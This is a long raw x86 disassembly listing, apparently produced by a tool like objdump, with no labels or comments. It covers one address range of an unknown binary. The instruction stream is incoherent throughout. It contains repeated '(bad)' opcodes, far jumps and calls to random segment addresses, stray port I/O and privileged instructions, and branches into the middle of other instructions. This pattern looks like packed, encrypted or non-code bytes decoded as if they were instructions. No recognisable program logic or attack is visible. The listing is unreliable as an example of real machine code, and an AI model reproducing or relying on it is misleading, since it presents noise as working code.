  420f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f1c:	fld    QWORD PTR [edi]
  420f1e:	clc    
  420f1f:	xchg   esp,eax
  420f20:	imul   ebx,DWORD PTR [edi],0x48
  420f23:	xchg   ebp,eax
  420f24:	das    
  420f25:	push   ebx
  420f26:	sahf   
  420f27:	cli    
  420f28:	mov    ah,0x2f
  420f2a:	test   eax,0xe41552f6
  420f2f:	sbb    al,0x86
  420f31:	test   al,0x46
  420f33:	sti    
  420f34:	jmp    0x75ed93a
  420f39:	test   BYTE PTR [ebp-0x7f],bl
  420f3c:	sbb    al,0x9e
  420f3e:	iret   
  420f3f:	add    eax,0x234e5d16
  420f44:	aad    0xa6
  420f46:	mov    BYTE PTR [eax-0x4ed829d7],ah
  420f4c:	scas   al,BYTE PTR es:[edi]
  420f4d:	call   0x58d94532
  420f52:	lds    edx,FWORD PTR [ebx]
  420f54:	je     0x420ef2
  420f56:	fidivr WORD PTR [eax+0x33]
  420f59:	dec    eax
  420f5a:	loopne 0x420fce
  420f5c:	push   esp
  420f5d:	bound  edx,QWORD PTR [ebp-0x3d9e02c4]
  420f63:	ins    DWORD PTR es:[edi],dx
  420f64:	imul   eax,edx,0xc437f4ee
  420f6a:	add    dl,BYTE PTR [edi-0x4a5969b7]
  420f70:	and    eax,DWORD PTR [eax]
  420f72:	sbb    bl,BYTE PTR [ebp+0x6d]
  420f75:	ret    
  420f76:	or     dh,BYTE PTR [esi+0x37]
  420f79:	or     esp,edi
  420f7b:	out    dx,al
  420f7c:	jge    0x420fac
  420f7e:	pop    edx
  420f7f:	test   BYTE PTR [bp-0x5c],0x44
  420f84:	lahf   
  420f85:	es or  al,0xdc
  420f88:	outs   dx,DWORD PTR ds:[esi]
  420f89:	xchg   esp,eax
  420f8a:	dec    esp
  420f8b:	imul   esi,ebx,0x2f
  420f8e:	pop    ds
  420f8f:	and    dh,BYTE PTR es:[ebx+ebp*1+0x7f]
  420f94:	shl    BYTE PTR [edi+0x29a73020],0x41
  420f9b:	push   DWORD PTR [edx+0x5a]
  420f9e:	pop    ebp
  420f9f:	dec    ebp
  420fa0:	lahf   
  420fa1:	sar    esi,cl
  420fa3:	mov    esi,0xd6a27dab
  420fa8:	test   BYTE PTR [esi+0x77deac3b],cl
  420fae:	xchg   ebp,eax
  420faf:	enter  0xdd12,0xa0
  420fb3:	sub    eax,0x446c143d
  420fb8:	aas    
  420fb9:	loop   0x420f44
  420fbb:	(bad)  
  420fbc:	popf   
  420fbd:	outs   dx,DWORD PTR ds:[esi]
  420fbe:	inc    edx
  420fbf:	shl    DWORD PTR [eax+0x32],cl
  420fc2:	lds    ebx,FWORD PTR ds:0x34a62b36
  420fc8:	mov    edi,0xca87459a
  420fcd:	jnp    0x420fbd
  420fcf:	addr16 inc ebp
  420fd1:	adc    al,0x43
  420fd3:	loop   0x420ff5
  420fd5:	pop    ebp
  420fd6:	popf   
  420fd7:	jno    0x420fff
  420fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fda:	mov    esi,0x1f19a1
  420fdf:	rcl    BYTE PTR [ecx-0x79],cl
  420fe2:	daa    
  420fe3:	imul   esi,ebx,0xffffffb8
  420fe6:	lock xchg esp,eax
  420fe8:	push   ecx
  420fe9:	inc    ebp
  420fea:	pop    edi
  420feb:	cmc    
  420fec:	cmp    eax,0x807834f
  420ff1:	pop    esp
  420ff2:	jp     0x420fd7
  420ff4:	xlat   BYTE PTR ds:[ebx]
  420ff5:	(bad)  
  420ff6:	es pusha 
  420ff8:	fnstsw ax
  420ffa:	jbe    0x421017
  420ffc:	fwait
  420ffd:	ret    
  420ffe:	dec    ebx
  420fff:	and    BYTE PTR [esi],ah
  421001:	adc    BYTE PTR [ecx],cl
  421003:	push   es
  421004:	and    al,0x28
  421006:	adc    eax,0x1e29ca13
  42100b:	stc    
  42100c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42100d:	add    eax,0xd8192bec
  421012:	pop    es
  421013:	ins    BYTE PTR es:[edi],dx
  421014:	jle    0x42107e
  421016:	mov    dh,0xad
  421018:	les    ecx,FWORD PTR [eax+0x7b]
  42101b:	xlat   BYTE PTR ds:[ebx]
  42101c:	sbb    DWORD PTR [edx-0x3c6b3637],0x52
  421023:	clc    
  421024:	jmp    0xebb8:0x4a5aba0d
  42102b:	pop    ebp
  42102c:	loope  0x42108e
  42102e:	jno    0x420ff1
  421030:	repz and eax,0x942c15b5
  421036:	cmp    DWORD PTR [ebp+esi*8+0x1],esi
  42103a:	pop    ss
  42103b:	pushf  
  42103c:	fucom  st(0)
  42103e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42103f:	test   ch,dh
  421041:	dec    edx
  421042:	ins    DWORD PTR es:[edi],dx
  421043:	rcr    WORD PTR [ecx],1
  421046:	fs jo  0x421047
  421049:	lock out dx,al
  42104b:	push   edx
  42104c:	sbb    al,cl
  42104e:	mov    edx,0x63a3b564
  421053:	adc    BYTE PTR ds:0x43d5ba51,bh
  421059:	adc    BYTE PTR [eax],bl
  42105b:	or     ecx,DWORD PTR [ecx+0x26054376]
  421061:	gs sti 
  421063:	pop    ebx
  421064:	mov    ds:0x9cdf10a1,eax
  421069:	xor    al,0xc6
  42106b:	xchg   esi,eax
  42106c:	fimul  WORD PTR [eax]
  42106e:	outs   dx,BYTE PTR ds:[esi]
  42106f:	mov    eax,0x323c9918
  421074:	sbb    al,0xe1
  421076:	xchg   ebp,eax
  421077:	sbb    eax,0xedfca923
  42107c:	out    dx,eax
  42107d:	pushf  
  42107e:	cmp    al,BYTE PTR ds:[ebp-0x55c37e22]
  421085:	out    0x67,al
  421087:	or     dh,al
  421089:	or     BYTE PTR [ebx],0x34
  42108c:	fs scas eax,DWORD PTR es:[edi]
  42108e:	gs jp  0x42106a
  421091:	in     eax,dx
  421092:	xchg   ebx,eax
  421093:	sbb    eax,0x9968fb8a
  421098:	adc    al,0x1f
  42109a:	jbe    0x4210a9
  42109c:	pop    ebx
  42109d:	pop    esp
  42109e:	outs   dx,DWORD PTR ds:[esi]
  42109f:	das    
  4210a0:	cmp    esi,DWORD PTR [ebx]
  4210a2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210a4:	cli    
  4210a5:	out    dx,al
  4210a6:	mov    esi,0xd1831c7c
  4210ab:	push   ebp
  4210ac:	mov    ds:0x60357b90,al
  4210b1:	xor    edx,DWORD PTR [esi+0x3b]
  4210b4:	ja     0x421131
  4210b6:	jb     0x4210fa
  4210b8:	jae    0x4210d9
  4210ba:	(bad)  
  4210bb:	or     dl,ch
  4210bd:	inc    edx
  4210be:	lds    esp,FWORD PTR [ecx]
  4210c0:	jmp    0xcb99:0xb4c4d64b
  4210c7:	enter  0x7618,0xa
  4210cb:	mov    ebx,0xaec14d71
  4210d0:	test   bl,cl
  4210d2:	sub    eax,0x9b5cbe1a
  4210d7:	xor    bh,BYTE PTR [ebx]
  4210d9:	repnz rol ebx,cl
  4210dc:	mov    ah,0x7d
  4210de:	push   ebp
  4210df:	and    BYTE PTR [ebx],ah
  4210e1:	jo     0x4210f6
  4210e3:	test   eax,0x1be47437
  4210e8:	push   edi
  4210e9:	sbb    al,0xd8
  4210eb:	out    dx,eax
  4210ec:	ret    0xf31
  4210ef:	mov    ss,WORD PTR ds:0x4e959a06
  4210f5:	inc    ebx
  4210f6:	or     edx,DWORD PTR [ebx+0x50]
  4210f9:	cwde   
  4210fa:	mov    DWORD PTR [ebp+0x37dfaa16],ebx
  421100:	pop    eax
  421101:	test   ebp,0x256bc7d4
  421107:	pop    edx
  421108:	mov    DWORD PTR [ebx+0x5a],ebx
  42110b:	mov    eax,ds:0x576e8e5e
  421110:	jp     0x421107
  421112:	ss push esi
  421114:	call   0x90ae:0x4b574360
  42111b:	mov    ds:0x5944769,eax
  421120:	lahf   
  421121:	cld    
  421122:	add    eax,0xb264abaf
  421127:	out    0x76,al
  421129:	xor    eax,DWORD PTR [ebp+eiz*1+0x39]
  42112d:	fs inc edx
  42112f:	inc    ebp
  421130:	pop    esi
  421131:	sub    eax,0x79d134bd
  421136:	retf   0x343e
  421139:	cmp    bh,BYTE PTR [edx]
  42113b:	sbb    eax,0x4ca22625
  421140:	push   cs
  421141:	in     al,dx
  421142:	retf   0x30fa
  421145:	adc    BYTE PTR [ebx],al
  421147:	js     0x421122
  421149:	ret    0x1e21
  42114c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42114d:	test   al,0x55
  42114f:	in     eax,dx
  421150:	ret    0x387
  421153:	and    dl,BYTE PTR [ecx-0x41]
  421156:	das    
  421157:	lods   al,BYTE PTR ds:[esi]
  421158:	call   DWORD PTR [edx+0x5e]
  42115b:	xchg   ebp,eax
  42115c:	sub    eax,0x370b092d
  421161:	mov    ah,ah
  421163:	shl    BYTE PTR [esi+ebp*1+0xc],cl
  421167:	dec    ecx
  421168:	mov    edx,0xcaeec82f
  42116d:	cwde   
  42116e:	jp     0x4211a2
  421170:	push   ss
  421171:	sbb    dh,BYTE PTR [eax+0x3]
  421174:	pop    ss
  421175:	popf   
  421176:	mov    ecx,0x157eec77
  42117b:	jne    0x421183
  42117d:	fst    QWORD PTR [eax]
  42117f:	in     al,dx
  421180:	fst    DWORD PTR [ebp+0x89578e4]
  421186:	scas   al,BYTE PTR es:[edi]
  421187:	unpcklps xmm3,xmm7
  42118a:	sbb    eax,0xf26c0f37
  42118f:	xchg   ecx,eax
  421190:	or     ecx,DWORD PTR [ebp+0x7b80a879]
  421196:	dec    edi
  421197:	loopne 0x421188
  421199:	cli    
  42119a:	cdq    
  42119b:	dec    esp
  42119c:	mov    ch,0x47
  42119e:	jle    0x4211b7
  4211a0:	lds    ebp,FWORD PTR fs:[ebx-0x20484b8f]
  4211a7:	popa   
  4211a8:	ret    0x28d4
  4211ab:	pushf  
  4211ac:	jl     0x421186
  4211ae:	and    edx,DWORD PTR [ecx]
  4211b0:	and    eax,0xf0a8c7a3
  4211b5:	add    BYTE PTR [ebx+0x47],0x67
  4211b9:	jge    0x42113b
  4211bb:	lds    ecx,FWORD PTR [esi-0x6f]
  4211be:	adc    al,0x42
  4211c0:	addr16 add al,0xf5
  4211c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211c4:	ins    BYTE PTR es:[edi],dx
  4211c5:	mov    ebp,0x360a7ba0
  4211ca:	and    BYTE PTR [eax-0xe],cl
  4211cd:	and    ch,ch
  4211cf:	fisubr DWORD PTR [ebp-0x37c03060]
  4211d5:	and    eax,0xdd97e739
  4211da:	push   ebp
  4211db:	mov    eax,ds:0xde23a49e
  4211e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211e1:	mov    edx,0xe6051cdc
  4211e6:	stc    
  4211e7:	jmp    0xcebad2bb
  4211ec:	ss (bad) 
  4211ee:	ss cs push ebp
  4211f1:	push   ebp
  4211f2:	lar    esi,WORD PTR [edx+0x47]
  4211f6:	fmul   st,st(2)
  4211f8:	inc    eax
  4211f9:	and    al,0x86
  4211fb:	cmp    edx,esi
  4211fd:	loopne 0x4211f6
  4211ff:	push   eax
  421200:	push   esp
  421201:	xor    al,BYTE PTR [eax-0x7a3dbbb]
  421207:	shr    DWORD PTR [esi-0x52bc2b67],1
  42120d:	and    al,0xa7
  42120f:	pop    esi
  421210:	imul   esp,esp,0xaef1dc68
  421216:	push   0x9
  421218:	and    eax,0xef61029
  42121d:	dec    ebp
  42121e:	in     eax,dx
  42121f:	mov    DWORD PTR [edi-0x6d585625],edi
  421225:	mov    bh,0x76
  421227:	rol    esp,cl
  421229:	and    DWORD PTR [edi+0x1e],esi
  42122c:	adc    DWORD PTR [ebx-0xfb34bc3],edx
  421232:	jbe    0x421279
  421234:	in     al,0xff
  421236:	xchg   ebx,eax
  421237:	test   DWORD PTR [ebx-0x56],edx
  42123a:	mov    ds:0xbc0e9c2e,al
  42123f:	mov    edx,0xb4a24ea5
  421244:	sub    DWORD PTR [eax+0x60],edx
  421247:	repz test cl,dl
  42124a:	mov    eax,ds:0x83440c55
  42124f:	jmp    0x4211f6
  421251:	sar    BYTE PTR ds:0x102d795a,0x65
  421258:	es push es
  42125a:	out    0x69,eax
  42125c:	rcl    ebx,0xbe
  42125f:	repz mov edi,0xe57e0d2d
  421265:	or     ch,BYTE PTR [edi]
  421267:	js     0x42122c
  421269:	(bad)  
  42126a:	jecxz  0x421235
  42126c:	je     0x421249
  42126e:	or     DWORD PTR [ecx+0x44],edi
  421271:	or     BYTE PTR [edi-0x70],al
  421274:	push   edx
  421275:	mov    ch,0x4e
  421277:	int    0x81
  421279:	lods   eax,DWORD PTR ds:[esi]
  42127a:	push   edi
  42127b:	dec    edx
  42127c:	dec    eax
  42127d:	jg     0x42128f
  42127f:	push   es
  421280:	pmaxub mm7,mm1
  421283:	dec    esi
  421284:	push   edx
  421285:	in     eax,0x6f
  421287:	outs   dx,BYTE PTR ds:[esi]
  421288:	mov    ecx,0xcac0e123
  42128d:	call   0x71aa:0x4bbe9082
  421294:	fiadd  DWORD PTR [ecx+ecx*1-0x17]
  421298:	adc    DWORD PTR [edi],esp
  42129a:	xchg   ebx,eax
  42129b:	lods   al,BYTE PTR ds:[esi]
  42129c:	das    
  42129d:	mov    ah,0x1
  42129f:	aaa    
  4212a0:	push   esp
  4212a1:	mov    al,ds:0xbdd65c69
  4212a6:	adc    ebx,DWORD PTR [ebx+0x3052fa10]
  4212ac:	adc    ebx,esi
  4212ae:	neg    BYTE PTR [ebx+0x2238b28f]
  4212b4:	jg     0x4212f1
  4212b6:	stos   BYTE PTR es:[edi],al
  4212b7:	add    bh,BYTE PTR ss:[ecx+0x4b1f0046]
  4212be:	xor    ah,ch
  4212c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212c1:	and    DWORD PTR [ebx+ebp*4],eax
  4212c4:	cdq    
  4212c5:	repz cdq 
  4212c7:	add    eax,DWORD PTR ds:0x4c6deb4
  4212cd:	mov    esp,0x4aed36a9
  4212d2:	mov    ebp,0x28cf892d
  4212d7:	add    DWORD PTR [ebp+0x748910bd],esp
  4212dd:	sar    edi,0xf4
  4212e0:	mov    ebp,0x9b2fec3
  4212e5:	push   ebp
  4212e6:	cmp    ecx,DWORD PTR [edx-0x48edb940]
  4212ec:	pop    eax
  4212ed:	sbb    dl,BYTE PTR [ebx-0x20f28c40]
  4212f3:	inc    ebp
  4212f4:	sbb    cl,BYTE PTR [ebp-0x11]
  4212f7:	jbe    0x421330
  4212f9:	and    ah,BYTE PTR [esi-0x76]
  4212fc:	pushf  
  4212fd:	xor    dl,BYTE PTR [esi-0x18]
  421300:	pop    ds
  421301:	mov    ss,esi
  421303:	inc    esp
  421304:	fisttp QWORD PTR [eax+0x4bde75e2]
  42130a:	cmp    esp,DWORD PTR [ebp+0x51b6575d]
  421310:	enter  0x76f8,0x31
  421314:	inc    esp
  421315:	push   esp
  421316:	mov    ebx,0x94d6206c
  42131b:	loop   0x4212dd
  42131d:	dec    eax
  42131e:	jmp    0xdf2e115a
  421323:	inc    esp
  421324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421325:	out    dx,eax
  421326:	aam    0x9b
  421328:	push   ebp
  421329:	sub    eax,0xa64fc491
  42132e:	mov    ds:0xcdf3cefa,eax
  421333:	pop    esp
  421334:	adc    BYTE PTR [eax],dh
  421336:	test   al,0x96
  421338:	in     eax,dx
  421339:	pushf  
  42133a:	pcmpeqw mm0,QWORD PTR [edx+0x32]
  42133e:	dec    eax
  42133f:	scas   al,BYTE PTR es:[edi]
  421340:	lds    ebp,FWORD PTR [ebx]
  421342:	pusha  
  421343:	push   ds
  421344:	jmp    0x86ee50af
  421349:	cmp    eax,0xa8d01d44
  42134e:	jns    0x42138e
  421350:	add    esp,esi
  421352:	aaa    
  421353:	out    dx,eax
  421354:	inc    esi
  421355:	xchg   DWORD PTR [esi+0x78],eax
  421358:	mov    al,ds:0x82620344
  42135d:	xor    eax,0x601481c0
  421362:	ins    BYTE PTR es:[edi],dx
  421363:	mov    dh,BYTE PTR [ebx-0x65]
  421366:	popf   
  421367:	jns    0x42133a
  421369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42136a:	repnz xlat BYTE PTR ds:[ebx]
  42136c:	in     eax,0x80
  42136e:	call   0x871d:0x234e1808
  421375:	retf   0xc034
  421378:	xlat   BYTE PTR ds:[ebx]
  421379:	jecxz  0x4212fd
  42137b:	gs leave 
  42137d:	into   
  42137e:	fs sbb bl,bh
  421381:	shl    cl,1
  421383:	fsubr  QWORD PTR [ebp-0x41]
  421386:	test   DWORD PTR [ebx+0x1e],esi
  421389:	jo     0x4213cc
  42138b:	rol    BYTE PTR [edi],1
  42138d:	scas   al,BYTE PTR es:[edi]
  42138e:	dec    edx
  42138f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421390:	xor    eax,0xd0dced86
  421395:	inc    eax
  421396:	pop    eax
  421397:	sbb    al,0x57
  421399:	in     al,0xd6
  42139b:	inc    BYTE PTR ds:0x5298ebb2
  4213a1:	add    al,0x84
  4213a3:	into   
  4213a4:	aas    
  4213a5:	fwait
  4213a6:	mov    ch,0x9f
  4213a8:	push   edi
  4213a9:	popf   
  4213aa:	aam    0xae
  4213ac:	popa   
  4213ad:	add    al,bh
  4213af:	leave  
  4213b0:	scas   al,BYTE PTR es:[edi]
  4213b1:	fmul   st(0),st
  4213b3:	std    
  4213b4:	pop    ebp
  4213b5:	cdq    
  4213b6:	test   DWORD PTR [eax+0x14024ff2],ebx
  4213bc:	rcl    DWORD PTR [esi+0x78],0x5a
  4213c0:	xchg   edi,eax
  4213c1:	enter  0x1352,0xb7
  4213c5:	jbe    0x421423
  4213c7:	fninit 
  4213c9:	ja     0x42138c
  4213cb:	cdq    
  4213cc:	mov    dh,BYTE PTR [ebp-0x5eb19076]
  4213d2:	out    dx,al
  4213d3:	data16 je 0x4213c6
  4213d6:	dec    edx
  4213d7:	in     eax,dx
  4213d8:	or     dl,BYTE PTR [edi]
  4213da:	inc    esp
  4213db:	inc    ebx
  4213dc:	mov    dl,0x5a
  4213de:	push   esp
  4213df:	retf   0x5892
  4213e2:	add    BYTE PTR [edx+0x4420a0b],dh
  4213e8:	std    
  4213e9:	test   BYTE PTR [esi],ah
  4213eb:	fisttp WORD PTR [esi-0x2e5447f5]
  4213f1:	sub    edi,DWORD PTR [ebp-0x4fb33632]
  4213f7:	mov    ah,0x44
  4213f9:	sbb    eax,0x5ba4358f
  4213fe:	clc    
  4213ff:	mov    ds:0x348579c2,eax
  421404:	add    BYTE PTR [edx],dh
  421406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421407:	cwde   
  421408:	jge    0x421424
  42140a:	js     0x421410
  42140c:	scas   eax,DWORD PTR es:[edi]
  42140d:	add    edx,DWORD PTR [eax-0x13fe9422]
  421413:	fwait
  421414:	js     0x421414
  421416:	dec    ebp
  421417:	outs   dx,DWORD PTR ds:[esi]
  421418:	cwde   
  421419:	shl    DWORD PTR [eax-0x7c],1
  42141c:	fnsave [esi-0x72]
  42141f:	aam    0xa3
  421421:	loope  0x4213ba
  421423:	sub    al,0x13
  421425:	sub    DWORD PTR [eax-0x5a],eax
  421428:	xor    eax,0xe2d97db2
  42142d:	std    
  42142e:	and    ebp,DWORD PTR fs:[ebp+0x9]
  421432:	jge    0x4214b3
  421434:	jl     0x421450
  421436:	jge    0x4213c2
  421438:	jbe    0x42142d
  42143a:	adc    DWORD PTR ds:[edi-0x34336b2b],0xb7d6eb42
  421445:	jmp    0x630c57b1
  42144a:	ret    
  42144b:	out    dx,eax
  42144c:	dec    ebp
  42144d:	(bad)  
  42144e:	popa   
  42144f:	out    dx,eax
  421450:	xchg   esi,eax
  421451:	mov    ebp,DWORD PTR [edx]
  421453:	add    dh,BYTE PTR [ecx+0x366e21b2]
  421459:	ret    
  42145a:	xor    edi,DWORD PTR [ecx+ebx*8+0x59]
  42145e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42145f:	xchg   BYTE PTR [ecx],bl
  421461:	push   0x7a66818a
  421466:	add    dl,BYTE PTR [esi]
  421468:	jmp    FWORD PTR [ecx+0x34aa2ae1]
  42146e:	lock aas 
  421470:	dec    esi
  421471:	mov    dh,0xda
  421473:	dec    eax
  421474:	lock sbb al,0xdb
  421477:	mov    DWORD PTR [ecx],ebp
  421479:	and    BYTE PTR [ebx-0xd],dl
  42147c:	ret    0xc9c0
  42147f:	push   ecx
  421480:	fld    TBYTE PTR [edx-0x20d00c75]
  421486:	or     bh,BYTE PTR [edi-0xa]
  421489:	ficomp WORD PTR [ecx]
  42148b:	ds fwait
  42148d:	pushf  
  42148e:	push   cs
  42148f:	push   edi
  421490:	add    al,0x13
  421492:	push   ecx
  421493:	push   ecx
  421494:	mov    ebx,0x2583772a
  421499:	outs   dx,DWORD PTR ds:[esi]
  42149a:	shl    bh,0xe9
  42149d:	mov    ch,0xf0
  42149f:	add    eax,DWORD PTR [esi]
  4214a1:	(bad)  
  4214a2:	outs   dx,BYTE PTR ds:[esi]
  4214a3:	(bad)  
  4214a4:	cmp    DWORD PTR [ecx+0x3914bbea],ebp
  4214aa:	mov    bh,0x7
  4214ac:	push   cs
  4214ad:	mov    eax,0x87807a1e
  4214b2:	popf   
  4214b3:	popa   
  4214b4:	imul   ecx,DWORD PTR [ecx],0x3c8d7938
  4214ba:	adc    cl,ch
  4214bc:	aam    0xaf
  4214be:	pminub mm4,QWORD PTR [ecx+edi*4-0x29]
  4214c3:	scas   al,BYTE PTR es:[edi]
  4214c4:	sbb    DWORD PTR ds:0x7076980e,0xffffffe9
  4214cb:	push   ecx
  4214cc:	xor    DWORD PTR [ebp-0x57e42e2d],ecx
  4214d2:	retf   0x3c70
  4214d5:	ds mov esi,0x8c0c56b2
  4214db:	enter  0x3119,0x67
  4214df:	pop    es
  4214e0:	and    DWORD PTR [ecx],0x6d85bdb7
  4214e6:	push   esp
  4214e7:	mov    WORD PTR [ebx],fs
  4214e9:	pop    esi
  4214ea:	mov    esi,0x864e4820
  4214ef:	nop
  4214f0:	push   ebp
  4214f1:	mov    esp,DWORD PTR [ebp-0x6e]
  4214f4:	xchg   ebp,eax
  4214f5:	pop    ebp
  4214f6:	out    0x9a,eax
  4214f8:	stos   DWORD PTR es:[edi],eax
  4214f9:	jg     0x42153d
  4214fb:	or     al,0x7a
  4214fd:	jns    0x4214d0
  4214ff:	xlat   BYTE PTR ds:[ebx]
  421500:	xchg   esp,eax
  421501:	xchg   ebx,eax
  421502:	inc    esp
  421503:	dec    ebx
  421505:	jnp    0x42f0b751
  42150b:	mov    edi,0x1a824c08
  421510:	out    0xda,eax
  421512:	pop    edi
  421513:	sti    
  421514:	dec    edi
  421515:	fst    DWORD PTR [ecx-0x8ea4d9e]
  42151b:	mov    al,ds:0x7937f0b6
  421520:	out    dx,eax
  421521:	fsub   st,st(0)
  421523:	mov    edx,0x441ba313
  421528:	sub    DWORD PTR [esi+esi*4+0x33],ebx
  42152c:	dec    esp
  42152d:	loopne 0x4214fc
  42152f:	jmp    0x421533
  421531:	loope  0x42152e
  421533:	mov    eax,0x2cadc334
  421538:	fmul   QWORD PTR [edx-0x24]
  42153b:	pop    ecx
  42153c:	adc    cl,BYTE PTR [ecx-0x2545f45c]
  421542:	jmp    0x7f27fc4d
  421547:	(bad)  
  421548:	sti    
  421549:	mov    ah,0xea
  42154b:	mov    bl,BYTE PTR [esp+esi*8+0x1f]
  42154f:	test   DWORD PTR [ebp+ecx*2+0x601dd3ad],0x8dd0d54d
  42155a:	pop    ss
  42155b:	test   al,0xf1
  42155d:	test   BYTE PTR [esi+0x1a],dl
  421560:	fistp  WORD PTR [ebp-0x57]
  421563:	popa   
  421564:	push   ebx
  421565:	lea    ecx,[esi+0x390ef030]
  42156b:	stc    
  42156c:	aas    
  42156d:	or     eax,0x9b859fb2
  421572:	sbb    eax,0x624dfdc1
  421577:	xor    ah,ch
  421579:	lds    edx,FWORD PTR [edx]
  42157b:	jg     0x421538
  42157d:	mov    bl,0x6c
  42157f:	pop    ss
  421580:	add    BYTE PTR [ecx+eax*4-0x17],dl
  421584:	mov    ds:0xc3b65178,eax
  421589:	rcl    dh,0x47
  42158c:	xchg   ebx,eax
  42158d:	mov    ebx,0x94e8bb0d
  421592:	pushf  
  421593:	scas   eax,DWORD PTR es:[edi]
  421594:	jmp    0x4215ef
  421596:	xchg   esp,eax
  421597:	fbstp  TBYTE PTR [ecx]
  421599:	rol    BYTE PTR [ecx-0x35],cl
  42159c:	test   al,0x20
  42159e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42159f:	out    dx,eax
  4215a0:	inc    ecx
  4215a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a2:	daa    
  4215a3:	adc    cl,BYTE PTR [esp+eiz*2-0x22d5781b]
  4215aa:	lods   eax,DWORD PTR ds:[esi]
  4215ab:	call   0xf937:0x8657cc1b
  4215b2:	fdiv   QWORD PTR [esi]
  4215b4:	sbb    al,0xc1
  4215b6:	rol    BYTE PTR [esp+ecx*2-0x49],cl
  4215ba:	int3   
  4215bb:	mov    edx,0xf815ef5e
  4215c0:	fild   WORD PTR [esi]
  4215c2:	lods   eax,DWORD PTR ds:[esi]
  4215c3:	js     0x42160d
  4215c5:	and    DWORD PTR [esi+ebx*4],ecx
  4215c8:	cli    
  4215c9:	fmul   QWORD PTR [edx]
  4215cb:	in     al,0xcc
  4215cd:	aad    0x8b
  4215cf:	and    bh,ah
  4215d1:	xor    eax,0x8b9de7d8
  4215d6:	mov    cl,0xad
  4215d8:	jmp    0xe39f:0x3dabce10
  4215df:	ss js  0x421640
  4215e2:	addr16 sub eax,edi
  4215e5:	and    BYTE PTR [edi],ch
  4215e7:	cmp    BYTE PTR [ecx-0x3816d57d],dh
  4215ed:	sbb    al,0x6f
  4215ef:	add    eax,0x782c2a04
  4215f4:	and    cl,cl
  4215f6:	inc    edi
  4215f7:	cmp    DWORD PTR [eax-0x48388cfb],0x1eb34bca
  421601:	jmp    0xcc5d:0x6baeba58
  421608:	inc    ebp
  421609:	iret   
  42160a:	hlt    
  42160b:	jle    0x42168c
  42160d:	hlt    
  42160e:	test   BYTE PTR [esp+eax*2-0x4262eb75],ah
  421615:	or     DWORD PTR [ecx-0x1d],ebx
  421618:	jb     0x4215d7
  42161a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42161b:	stos   BYTE PTR es:[edi],al
  42161c:	and    BYTE PTR [edx-0x7c9316c0],dh
  421622:	xchg   esp,eax
  421623:	imul   edx,DWORD PTR [edi],0xd5d03eda
  421629:	iret   
  42162a:	out    dx,eax
  42162b:	adc    edx,0x11
  42162e:	cmp    BYTE PTR [ecx-0x16b7da27],dl
  421634:	int3   
  421635:	push   esp
  421636:	retf   0xa230
  421639:	call   0x7b5b514b
  42163e:	leave  
  42163f:	out    0xc6,eax
  421641:	mov    dh,0x9d
  421643:	sub    BYTE PTR [ebx+0x49aea70],dh
  421649:	xchg   esi,eax
  42164a:	pop    eax
  42164b:	loopne 0x421617
  42164d:	xchg   ebx,ebp
  42164f:	nop
  421650:	scas   al,BYTE PTR es:[edi]
  421651:	xchg   esi,eax
  421652:	add    eax,0xcf3f0635
  421657:	and    esp,DWORD PTR [ebx+0x179851cb]
  42165d:	int    0xe4
  42165f:	push   ebp
  421660:	sub    al,0xf8
  421662:	add    BYTE PTR [ecx+0x5d89e516],dl
  421668:	jecxz  0x421680
  42166a:	and    edi,DWORD PTR [esi-0xb1fb0f6]
  421670:	(bad)  
  421672:	sub    eax,0x9bd5a0a6
  421677:	cs popf 
  421679:	cmp    eax,0x794f89c0
  42167e:	mov    al,0x2d
  421680:	nop
  421681:	pop    edi
  421682:	fnsave [eax]
  421684:	pop    eax
  421685:	sahf   
  421686:	lock addr16 jmp 0x42162f
  42168a:	(bad)  [edx+0x483d36c7]
  421690:	xchg   ecx,ebx
  421692:	stos   DWORD PTR es:[edi],eax
  421693:	pop    eax
  421694:	sbb    al,0xcf
  421696:	pop    es
  421697:	push   eax
  421698:	sub    BYTE PTR [edx-0x35333af9],bh
  42169e:	in     eax,dx
  42169f:	cmp    al,0x28
  4216a1:	ror    dh,0xa5
  4216a4:	out    dx,al
  4216a5:	xchg   DWORD PTR ds:0x7992d05e,edx
  4216ab:	pusha  
  4216ac:	push   edi
  4216ad:	outs   dx,BYTE PTR ds:[esi]
  4216ae:	dec    esp
  4216af:	inc    ecx
  4216b0:	jb     0x42166c
  4216b2:	out    dx,al
  4216b3:	jmp    0x421670
  4216b5:	(bad)  [ebx-0x298d7078]
  4216bb:	int    0x63
  4216bd:	fiadd  WORD PTR [esi+0x7ed0d1d8]
  4216c3:	sbb    bh,ch
  4216c5:	jae    0x42169d
  4216c7:	fdivr  QWORD PTR [edi]
  4216c9:	loop   0x421707
  4216cb:	rcr    DWORD PTR [eax-0x5c],0x99
  4216cf:	dec    ebp
  4216d0:	outs   dx,DWORD PTR ds:[esi]
  4216d1:	dec    esp
  4216d2:	fld    DWORD PTR [edx+0x2f903b01]
  4216d8:	xchg   esp,eax
  4216d9:	rcl    BYTE PTR [eax+ebx*1-0x21],cl
  4216dd:	jmp    0xd0604986
  4216e2:	ret    
  4216e3:	stos   DWORD PTR es:[edi],eax
  4216e4:	test   al,0xc4
  4216e6:	pop    eax
  4216e7:	jmp    0x42174e
  4216e9:	sahf   
  4216ea:	dec    ebx
  4216eb:	adc    BYTE PTR ds:0x31103691,bh
  4216f1:	out    dx,eax
  4216f2:	cmp    ebx,DWORD PTR [eax]
  4216f4:	or     BYTE PTR [ebx],bh
